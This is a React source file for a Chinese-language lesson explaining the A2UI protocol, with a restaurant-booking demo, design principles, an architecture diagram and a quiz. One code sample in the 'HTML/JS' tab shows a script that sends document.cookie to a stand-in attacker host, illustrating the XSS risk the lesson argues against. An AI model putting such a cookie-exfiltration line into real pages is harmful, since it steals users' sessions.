import { useState } from "react"
import { ArrowDown, ArrowUp, Bot, Boxes, Code, MessageSquare, Monitor, Radio, Shield, Sparkles, UserRound, Zap } from "lucide-react"
import { cn } from "cn"

import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { CodeBlock, C } from "@/components/learn/code-block"
import { SurfacePreview } from "@/components/learn/inspector"
import { DemoCard, LessonShell } from "@/components/learn/lesson-shell"
import { useDemo } from "@/components/learn/message-editor"
import { Bullets, Callout, P, Section, Steps } from "@/components/learn/prose"

import { bind, comps, create, data, text } from "./msg"

const BOOKING = [
  create("booking", { theme: { agentDisplayName: "订餐助手" } }),
  comps("booking", [
    { id: "root", component: "Card", child: "col" },
    { id: "col", component: "Column", children: ["title", "when", "guests", "submit"] },
    text("title", "预订：山海小馆", "h4"),
    { id: "when", component: "DateTimeInput", label: "日期与时间", value: bind("/reservation/datetime"), enableDate: true, enableTime: true },
    { id: "guests", component: "Slider", label: "人数", value: bind("/reservation/guests"), min: 1, max: 10 },
    {
      id: "submit",
      component: "Button",
      child: "submit-text",
      variant: "primary",
      action: { event: { name: "confirm_booking", context: { when: bind("/reservation/datetime"), guests: bind("/reservation/guests") } } },
    },
    text("submit-text", "确认预订"),
  ]),
  data("booking", { reservation: { datetime: "2026-10-02T19:00", guests: 2 } }),
]

function Bubble({ from, children }: { from: "user" | "agent"; children: React.ReactNode }) {
  return (
    <div className={cn("flex gap-2", from === "user" && "flex-row-reverse")}>
      <span className="flex size-6 shrink-0 items-center justify-center rounded-full border bg-background">
        {from === "user" ? <UserRound className="size-3.5" /> : <Bot className="size-3.5" />}
      </span>
      <span
        className={cn(
          "max-w-[80%] rounded-2xl px-3 py-1.5 text-sm",
          from === "user" ? "rounded-tr-sm bg-primary text-primary-foreground" : "rounded-tl-sm bg-muted"
        )}
      >
        {children}
      </span>
    </div>
  )
}

function ThreeWays() {
  const [lastAction, setLastAction] = useState<string | null>(null)
  const a2ui = useDemo(BOOKING, {
    onAction: (a) => setLastAction(JSON.stringify(a.context)),
  })

  return (
    <Tabs defaultValue="a2ui" className="gap-4">
      <TabsList className="w-full sm:w-fit">
        <TabsTrigger value="text">
          <MessageSquare /> 纯文本
        </TabsTrigger>
        <TabsTrigger value="code">
          <Code /> 发送 HTML/JS
        </TabsTrigger>
        <TabsTrigger value="a2ui">
          <Sparkles /> A2UI
        </TabsTrigger>
      </TabsList>

      <TabsContent value="text" className="grid gap-4 md:grid-cols-2">
        <div className="flex flex-col gap-2 rounded-xl border p-4">
          <Bubble from="user">帮我订山海小馆，明晚两个人</Bubble>
          <Bubble from="agent">好的！请问几点？</Bubble>
          <Bubble from="user">7 点吧</Bubble>
          <Bubble from="agent">7 点大厅已满，7 点半可以吗？还是换包间？</Bubble>
          <Bubble from="user">包间多少钱…</Bubble>
          <Bubble from="agent">包间最低消费 ¥800。另外请提供联系电话…</Bubble>
        </div>
        <div className="flex flex-col gap-3 text-sm leading-6">
          <span className="font-medium">安全，但低效</span>
          <Bullets
            items={[
              "每个参数都要来回问一轮，用户在“填表”却看不到表单",
              "日期、人数、选项这类结构化输入，用文字表达很容易出错",
              "Agent 无法展示图片、列表、按钮等更丰富的信息",
            ]}
          />
        </div>
      </TabsContent>

      <TabsContent value="code" className="grid gap-4 md:grid-cols-2">
        <CodeBlock
          language="text"
          title="agent-response.html"
          code={`<form class="booking">
  <input type="datetime-local" />
  <button onclick="submit()">确认</button>
</form>
<script>
  // 远端 Agent 生成的代码在你的应用里执行……
  fetch("https://evil.example/steal?c=" + document.cookie)
</script>`}
        />
        <div className="flex flex-col gap-3 text-sm leading-6">
          <span className="font-medium">强大，但危险</span>
          <Bullets
            items={[
              <>跨越<strong>信任边界</strong>执行任意代码：XSS、数据窃取、UI 注入</>,
              "生成的样式与宿主应用割裂，品牌与无障碍规范难以保证",
              "HTML 只适用于 Web —— iOS、Android、Flutter、桌面端怎么办？",
            ]}
          />
        </div>
      </TabsContent>

      <TabsContent value="a2ui" className="grid gap-4 md:grid-cols-2">
        <div className="flex min-w-0 flex-col gap-2">
          <CodeBlock title="Agent 发送的是数据（节选）" code={BOOKING[1]} maxHeight={320} />
        </div>
        <div className="flex min-w-0 flex-col gap-3">
          <SurfacePreview a2ui={a2ui} />
          <div className="rounded-lg border border-dashed px-3 py-2 font-mono text-[11px] text-muted-foreground">
            {lastAction ? (
              <span className="text-orange-600 dark:text-orange-400">↑ action "confirm_booking" 已发送给 Agent：{lastAction}</span>
            ) : (
              "试试调整人数，然后点击「确认预订」"
            )}
          </div>
          <span className="text-sm leading-6">
            <strong>安全且原生：</strong>Agent 只描述“需要一个日期选择器和一个滑块”，客户端用<em>自己的</em>组件（这里是
            shadcn/ui）把它画出来。
          </span>
        </div>
      </TabsContent>
    </Tabs>
  )
}

const PRINCIPLES = [
  { icon: Shield, title: "安全优先", body: "传输的是声明式数据而不是代码。Agent 只能引用客户端 catalog 中预先批准的组件。" },
  { icon: Zap, title: "对 LLM 友好", body: "扁平的组件列表 + ID 引用，便于模型逐步生成，不必一次输出完美的嵌套结构。" },
  { icon: Boxes, title: "与框架无关", body: "同一份 JSON 可被 React、Angular、Lit、Flutter、原生移动端分别渲染成原生控件。" },
  { icon: Radio, title: "渐进渲染", body: "消息以流的形式到达，界面一边生成一边出现，用户无需等待完整响应。" },
]

const Box = ({ icon: Icon, title, sub, className }: { icon: typeof Bot; title: string; sub: string; className?: string }) => (
  <div className={cn("flex flex-1 flex-col items-center gap-1 rounded-xl border bg-background p-4 text-center", className)}>
    <Icon className="size-5" />
    <span className="text-sm font-semibold">{title}</span>
    <span className="text-xs leading-5 text-muted-foreground">{sub}</span>
  </div>
)
const FlowLink = ({ down, up }: { down: string; up: string }) => (
  <div className="flex shrink-0 flex-row items-center justify-center gap-3 py-1 md:flex-col md:px-2 md:py-0">
    <span className="flex items-center gap-1 font-mono text-[10px] text-sky-600 dark:text-sky-400">
      <ArrowDown className="size-3 md:rotate-90" />
      {down}
    </span>
    <span className="flex items-center gap-1 font-mono text-[10px] text-orange-600 dark:text-orange-400">
      <ArrowUp className="size-3 md:rotate-90" />
      {up}
    </span>
  </div>
)

function ArchitectureDiagram() {
  return (
    <div className="flex flex-col items-stretch rounded-xl border bg-muted/30 p-4 md:flex-row-reverse md:items-center">
      <Box icon={Bot} title="Agent（LLM）" sub="理解意图，生成 A2UI 消息" />
      <FlowLink down="A2UI 消息 (JSONL)" up="action 事件" />
      <Box icon={Radio} title="传输层" sub="A2A · AG-UI · MCP · SSE · WebSocket" className="md:max-w-44" />
      <FlowLink down="逐条送达" up="用户操作" />
      <Box icon={Monitor} title="客户端渲染器" sub="按 catalog 把组件映射为原生控件" className="border-primary/40" />
      <FlowLink down="原生 UI" up="点击 / 输入" />
      <Box icon={UserRound} title="用户" sub="看到并操作界面" className="md:max-w-32" />
    </div>
  )
}

export default function WhyLesson() {
  return (
    <LessonShell
      slug="why"
      intro={
        <>
          当用户对 AI 说“帮我订明晚 7 点两个人的位子”，最好的回应往往不是一段文字，而是一个可以直接操作的表单。但 Agent
          通常运行在远端、甚至属于第三方——它该如何把界面“发”给用户，又不让用户的应用执行陌生代码？
          <strong> A2UI（Agent-to-UI）</strong>就是 Google 发起的开源协议（Apache 2.0），专门回答这个问题。
        </>
      }
      takeaways={[
        "A2UI 是一个让 Agent 生成界面的协议：Agent 发送声明式 JSON，客户端用原生组件渲染。",
        "它解决的核心问题是：如何安全地跨越信任边界传递 UI —— 传数据，不传代码。",
        "客户端掌握一份组件 catalog（白名单），Agent 只能从中挑选组件。",
        "同一份消息可在 Web、移动端、桌面端渲染；消息可以流式到达、渐进呈现。",
      ]}
      quiz={[
        {
          q: "A2UI 与“让 LLM 直接生成 HTML”相比，最根本的区别是什么？",
          options: ["A2UI 的 JSON 更短", "A2UI 传输声明式数据，由客户端决定如何渲染，不执行 Agent 的代码", "A2UI 只能用于 React", "A2UI 不需要网络"],
          answer: 1,
          explain: "A2UI 的安全性来自“数据而非代码”：Agent 只能描述要哪些 catalog 中的组件，真正的渲染逻辑始终在客户端手里。",
        },
        {
          q: "下面哪一项不是 A2UI 的设计目标？",
          options: ["对 LLM 友好、可增量生成", "与 UI 框架无关", "替代 A2A / MCP 这类传输协议", "支持渐进渲染"],
          answer: 2,
          explain: "A2UI 是“负载格式”，与传输无关。它可以跑在 A2A、MCP、AG-UI、SSE、WebSocket 之上，与这些协议是互补关系。",
        },
      ]}
    >
      <Section title="同一个请求，三种回应方式" kicker="01 · 问题">
        <P>
          设想一个订餐 Agent。它可以只回复文字，可以直接生成一段网页代码，也可以用 A2UI 描述一个界面。切换下面的选项卡感受差别——A2UI
          选项卡里的表单是<strong>真实渲染</strong>的，可以操作。
        </P>
        <DemoCard>
          <ThreeWays />
        </DemoCard>
      </Section>

      <Section title="四个设计原则" kicker="02 · 原则">
        <div className="grid gap-3 sm:grid-cols-2">
          {PRINCIPLES.map(({ icon: Icon, title, body }) => (
            <div key={title} className="flex gap-3 rounded-xl border p-4">
              <span className="flex size-9 shrink-0 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Icon className="size-4.5" />
              </span>
              <div className="flex flex-col gap-1">
                <span className="text-sm font-semibold">{title}</span>
                <span className="text-sm leading-6 text-muted-foreground">{body}</span>
              </div>
            </div>
          ))}
        </div>
      </Section>

      <Section title="一张图看懂 A2UI" kicker="03 · 架构">
        <ArchitectureDiagram />
        <Steps
          items={[
            { title: "用户向 Agent 发送消息", body: "例如“帮我订个餐厅”。" },
            { title: "Agent 生成 A2UI 消息", body: "描述界面结构（组件）与数据（data model）。" },
            { title: "消息流式传输到客户端", body: "每条消息独立、可立即处理，界面逐步出现。" },
            { title: "客户端用原生组件渲染", body: "只渲染 catalog 中存在的组件类型。" },
            { title: "用户交互，action 回传给 Agent", body: "点击按钮时，客户端把事件和相关数据发回 Agent。" },
            { title: "Agent 回应新的 A2UI 消息", body: "更新组件、更新数据，或删除这个界面。" },
          ]}
        />
      </Section>

      <Section title="A2UI 不是什么" kicker="04 · 澄清">
        <div className="grid gap-3 md:grid-cols-3">
          <Callout tone="warn" title="不是组件库">
            A2UI 不提供按钮的样式。它只定义“有一个按钮”，外观完全由客户端的设计系统决定。
          </Callout>
          <Callout tone="warn" title="不是让 LLM 写代码">
            消息里没有 <C>onclick</C>、没有脚本。交互通过命名的 action 与注册函数完成。
          </Callout>
          <Callout tone="warn" title="不是传输协议">
            它是跑在 A2A、MCP、AG-UI 等之上的“负载”，自身与传输无关。
          </Callout>
        </div>
      </Section>
    </LessonShell>
  )
}
